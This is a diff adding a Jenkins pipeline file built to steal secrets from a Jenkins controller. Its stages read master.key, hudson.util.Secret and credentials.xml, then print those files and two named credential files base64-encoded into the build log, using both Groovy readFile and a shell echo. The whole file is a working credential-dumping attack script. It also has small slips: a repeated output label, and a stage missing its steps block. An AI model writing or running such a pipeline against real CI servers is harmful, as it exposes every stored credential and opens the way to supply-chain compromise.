@@ -1,0 +1,48 @@
+#!/usr/bin/env groovy
+
+pipeline {
+  agent any
+  stages {
+    stage('Dump all secrets') {
+      agent {
+        label 'built-in'
+      }
+      steps {
+        dir('/var/jenkins_home') {  // or /var/lib/jenkins
+          script {
+            def paths = ['secrets/master.key', 'secrets/hudson.util.Secret', 'credentials.xml']
+            for (path in paths) {
+              println('result:' + path + ':' + readFile(file: path, encoding: 'Base64'))
+            }
+          }
+        }
+      }
+    }
+    stage('Get file credentials') {
+      agent {
+        label 'built-in'
+      }
+      environment {
+        CRED1 = credentials('changeme1')
+        CRED2 = credentials('changeme2')
+      }
+      steps {
+        script {
+          println('result:changeme1:' + readFile(file: "${CRED1}", encoding: 'Base64'))
+          println('result:changeme2:' + readFile(file: "${CRED2}", encoding: 'Base64'))
+        }
+      }
+    }
+    stage('Get file credentials alternate') {
+      agent {
+        label 'built-in'
+      }
+      withCredentials([file(credentialsId: 'changeme1', variable: 'CRED1'), file(credentialsId: 'changeme2', variable: 'CRED2')]) {
+        sh '''
+          echo "result:changeme1:$(base64 -w0 "$CRED1")"
+          echo "result:changeme1:$(base64 -w0 "$CRED2")"
+        '''
+      }
+    }
+  }
+}
